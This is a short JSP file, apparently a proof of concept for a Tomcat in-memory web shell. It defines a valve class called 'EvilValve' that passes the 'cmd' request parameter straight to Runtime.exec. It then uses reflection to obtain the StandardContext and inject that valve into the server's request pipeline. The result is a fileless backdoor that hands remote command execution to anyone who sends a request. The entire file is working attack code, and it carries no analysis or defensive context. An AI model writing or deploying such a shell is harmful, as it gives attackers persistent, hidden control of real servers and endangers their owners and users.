<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="javax.servlet.annotation.WebServlet" %>
<%@ page import="javax.servlet.http.HttpServlet" %>
<%@ page import="javax.servlet.http.HttpServletRequest" %>
<%@ page import="javax.servlet.http.HttpServletResponse" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page import="org.apache.catalina.connector.Response" %>

<%
 class EvilValve extends ValveBase {

 @Override
 public void invoke(Request request, Response response) throws IOException, ServletException {
 System.out.println("111");
 try {
 Runtime.getRuntime().exec(request.getParameter("cmd"));
 } catch (Exception e) {

 } } }%>

<%
 // 更简单的方法 获取StandardContext
 Field reqF = request.getClass().getDeclaredField("request");
 reqF.setAccessible(true);
 Request req = (Request) reqF.get(request);
 StandardContext standardContext = (StandardContext) req.getContext();

 standardContext.getPipeline().addValve(new EvilValve());

 out.println("inject success");
%>
